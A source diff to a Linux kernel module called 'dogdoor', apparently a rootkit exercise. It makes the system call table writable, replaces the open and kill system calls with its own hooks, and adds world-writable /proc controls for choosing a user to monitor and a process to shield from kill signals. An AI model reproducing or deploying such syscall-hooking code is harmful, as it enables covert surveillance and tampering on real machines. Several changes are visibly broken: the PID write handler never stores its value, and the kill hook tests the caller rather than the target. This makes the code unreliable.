@@ -14,16 +14,15 @@
 #include <asm/segment.h>
 #include <asm/uaccess.h>
 #define FILENAME_COUNT 10
-#define FILENAME_SIZE 512
+#define FILENAME_SIZE 256
 
 MODULE_LICENSE("GPL");
 
-char user_uid[128] = "-1";
-void ** sctable ;
 char * accessed_filenames[FILENAME_COUNT];
+char user_uid[128] = "-1";
 int count_accessed_filenames = 0;
-
-asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
+char current_pid[16] = "-1";
+void ** sctable ;
 
 static
 int is_in_filename(const char __user * filename) {
@@ -52,12 +51,9 @@ void init_filenames(const char __user * filename) {
 	}
 }
 
+asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
 {
-	char fname[256] ;
-
-	copy_from_user(fname, filename, 256) ;
-
     const struct cred * my_cred = current_cred();
     int i_user_uid = (int)simple_strtol(user_uid, NULL, 10);
 
@@ -66,6 +62,22 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
     }
 
 	return orig_sys_open(filename, flags, mode) ;
+}
+
+asmlinkage int (*orig_sys_kill)(int pid, int sig); 
+asmlinkage int dogdoor_sys_kill(int pid, int sig)
+{
+    /*const struct cred * my_cred = current_cred();*/
+
+    printk("PIDDDDDDD: %d\n", current->pid);
+    printk("PIDDDDDDD: %d\n", pid_nr(task_pid(current)));
+    int i_current_pid = (int)simple_strtol(current_pid, NULL, 10);
+
+    if (current->pid == i_current_pid && i_current_pid != -1) {
+        return 1;
+    }
+
+	return orig_sys_kill(pid, sig);
 }
 
 static
@@ -90,6 +102,25 @@ ssize_t dogdoor_log_proc_read(struct file *file, char __user *ubuf, size_t size,
 }
 
 static
+ssize_t dogdoor_pid_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
+{
+	ssize_t toread ;
+    int i;
+    char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);
+
+    strcpy(cattest, "CURRENT PID:");
+    strcat(cattest, current_pid);
+    strcat(cattest, "\n");
+    toread = strlen(cattest) >= *offset + size ? size : strlen(cattest) - *offset ;
+    if (copy_to_user(ubuf, cattest+ *offset, toread))
+        return -EFAULT ;	
+    *offset = *offset + toread ;
+
+    kfree(cattest);
+	return toread ;
+}
+
+static
 ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
 	char buf[256] ;
@@ -103,6 +134,23 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
 	*offset = *offset + toread ;
 	return toread ;
 }
+
+static 
+ssize_t dogdoor_pid_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
+{ 
+	char buf[128] ;
+
+	if (*offset != 0 || size > 128)
+		return -EFAULT ;
+
+	if (copy_from_user(buf, ubuf, size))
+		return -EFAULT ;
+
+	/*sscanf(buf,"%s", user_uid) ;*/
+	*offset = strlen(buf) ;
+    return 0 ; 
+}
+
 
 static 
 ssize_t dogdoor_log_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
@@ -149,6 +197,15 @@ static const struct file_operations dogdoor_log_fops = {
 	.release = 	proc_release,
 } ;
 
+static const struct file_operations dogdoor_pid_fops = {
+	.owner = 	THIS_MODULE,
+	.open = 	proc_open,
+	.read = 	dogdoor_pid_proc_read,
+	.write = 	dogdoor_pid_proc_write,
+	.llseek = 	seq_lseek,
+	.release = 	proc_release,
+} ;
+
 static const struct file_operations dogdoor_fops = {
 	.owner = 	THIS_MODULE,
 	.open = 	proc_open,
@@ -171,14 +228,17 @@ int __init dogdoor_init(void) {
 
 	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
 	proc_create("dogdoor_log", S_IRUGO | S_IWUGO, NULL, &dogdoor_log_fops) ;
+	proc_create("dogdoor_pid", S_IRUGO | S_IWUGO, NULL, &dogdoor_pid_fops) ;
 
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
 	orig_sys_open = sctable[__NR_open] ;
+	orig_sys_kill = sctable[__NR_kill] ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
 		pte->pte |= _PAGE_RW ;		
 	sctable[__NR_open] = dogdoor_sys_open ;
+    sctable[__NR_kill] = dogdoor_sys_kill ;
 
 	return 0;
 }
@@ -189,8 +249,10 @@ void __exit dogdoor_exit(void) {
 	pte_t * pte ;
 	remove_proc_entry("dogdoor", NULL) ;
 	remove_proc_entry("dogdoor_log", NULL) ;
+	remove_proc_entry("dogdoor_pid", NULL) ;
 
 	sctable[__NR_open] = orig_sys_open ;
+	sctable[__NR_kill] = orig_sys_kill ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	pte->pte = pte->pte &~ _PAGE_RW ;
 }
